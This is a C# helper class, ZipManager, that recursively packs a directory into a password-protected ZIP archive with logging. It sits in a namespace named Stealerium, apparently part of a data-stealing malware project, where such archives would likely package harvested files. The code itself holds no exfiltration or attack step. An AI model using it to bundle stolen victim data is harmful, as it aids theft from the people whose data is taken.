using System;
using System.IO;
using ICSharpCode.SharpZipLib.Zip;
using ICSharpCode.SharpZipLib.Core;

namespace Stealerium.Helpers
{
    internal class ZipManager
    {
        /// <summary>
        /// Creates a password-protected ZIP archive of the specified directory with an optional comment.
        /// </summary>
        /// <param name="sourceDirectory">The directory to archive.</param>
        /// <param name="destinationArchive">The path of the resulting ZIP file.</param>
        /// <param name="password">The password for the ZIP archive.</param>
        /// <param name="comment">Optional comment to add to the ZIP archive.</param>
        public static void CreatePasswordProtectedZip(string sourceDirectory, string destinationArchive, string password, string comment = null)
        {
            // Log the start of the ZIP process
            Logging.Log($"Starting ZIP creation: Source='{sourceDirectory}', Destination='{destinationArchive}'");

            try
            {
                // Ensure the source directory exists
                if (!Directory.Exists(sourceDirectory))
                {
                    string errorMsg = $"Source directory not found: {sourceDirectory}";
                    Logging.Log(errorMsg);
                    return; // Exit early since the source directory doesn't exist
                }

                // Create or overwrite the ZIP file
                using (FileStream fsOut = File.Create(destinationArchive))
                using (ZipOutputStream zipStream = new ZipOutputStream(fsOut))
                {
                    // Set the password for encryption
                    zipStream.Password = password;

                    // Set the compression level (0-9)
                    zipStream.SetLevel(9); // 9 = Best compression

                    // Log ZIP stream setup
                    Logging.Log("ZIP stream initialized with password protection and maximum compression.");

                    // Recursively add files to the ZIP
                    AddDirectoryToZip(zipStream, sourceDirectory, sourceDirectory);

                    // Set the ZIP archive comment if provided
                    if (!string.IsNullOrEmpty(comment))
                    {
                        zipStream.SetComment(comment);
                        Logging.Log("ZIP archive comment added.");
                    }
                }

                // Log successful completion
                Logging.Log($"ZIP creation completed successfully: {destinationArchive}");
            }
            catch (Exception ex)
            {
                // Log any exceptions that occur during the ZIP process
                Logging.Log($"Error during ZIP creation: {ex.Message}");
            }
        }

        /// <summary>
        /// Recursively adds a directory and its files to the ZIP stream.
        /// </summary>
        /// <param name="zipStream">The ZIP output stream.</param>
        /// <param name="currentDirectory">The current directory to add.</param>
        /// <param name="baseDirectory">The base directory for relative paths.</param>
        private static void AddDirectoryToZip(ZipOutputStream zipStream, string currentDirectory, string baseDirectory)
        {
            try
            {
                // Get all files in the current directory
                string[] files = Directory.GetFiles(currentDirectory);

                foreach (string filePath in files)
                {
                    // Get the relative path for the ZIP entry
                    string entryName = GetRelativePath(baseDirectory, filePath).Replace("\\", "/");
                    ZipEntry newEntry = new ZipEntry(entryName)
                    {
                        DateTime = File.GetLastWriteTime(filePath),
                        Size = new FileInfo(filePath).Length
                    };

                    // Add the entry to the ZIP stream
                    zipStream.PutNextEntry(newEntry);

                    // Write the file content to the ZIP entry
                    using (FileStream fsInput = File.OpenRead(filePath))
                    {
                        StreamUtils.Copy(fsInput, zipStream, new byte[4096]);
                    }

                    zipStream.CloseEntry();
                }

                // Recursively add subdirectories
                string[] directories = Directory.GetDirectories(currentDirectory);
                foreach (string dir in directories)
                {
                    AddDirectoryToZip(zipStream, dir, baseDirectory);
                }
            }
            catch (Exception ex)
            {
                // Log any exceptions that occur during the addition of directories or files
                Logging.Log($"Error while adding directory '{currentDirectory}' to ZIP: {ex.Message}");
            }
        }

        /// <summary>
        /// Computes the relative path from one directory to another.
        /// </summary>
        /// <param name="basePath">The base directory.</param>
        /// <param name="fullPath">The target directory or file.</param>
        /// <returns>The relative path from the base directory to the target.</returns>
        private static string GetRelativePath(string basePath, string fullPath)
        {
            if (string.IsNullOrEmpty(basePath))
                throw new ArgumentNullException(nameof(basePath));
            if (string.IsNullOrEmpty(fullPath))
                throw new ArgumentNullException(nameof(fullPath));

            Uri baseUri = new Uri(AppendDirectorySeparatorChar(basePath));
            Uri fullUri = new Uri(fullPath);

            if (baseUri.Scheme != fullUri.Scheme)
            {
                // Path can't be made relative.
                return fullPath;
            }

            Uri relativeUri = baseUri.MakeRelativeUri(fullUri);
            string relativePath = Uri.UnescapeDataString(relativeUri.ToString());

            // Replace forward slashes with backslashes if necessary
            if (fullUri.Scheme.Equals("file", StringComparison.InvariantCultureIgnoreCase))
            {
                relativePath = relativePath.Replace('/', Path.DirectorySeparatorChar);
            }

            return relativePath;
        }

        /// <summary>
        /// Ensures that the directory path ends with a directory separator character.
        /// </summary>
        /// <param name="path">The directory path.</param>
        /// <returns>The directory path ending with a separator character.</returns>
        private static string AppendDirectorySeparatorChar(string path)
        {
            if (!EndsInDirectorySeparator(path))
            {
                return path + Path.DirectorySeparatorChar;
            }
            return path;
        }

        /// <summary>
        /// Determines whether the specified path ends with a directory separator character.
        /// </summary>
        /// <param name="path">The path to check.</param>
        /// <returns>True if the path ends with a directory separator; otherwise, false.</returns>
        private static bool EndsInDirectorySeparator(string path)
        {
            if (string.IsNullOrEmpty(path))
                return false;

            char lastChar = path[path.Length - 1];
            return lastChar == Path.DirectorySeparatorChar || lastChar == Path.AltDirectorySeparatorChar;
        }
    }
}
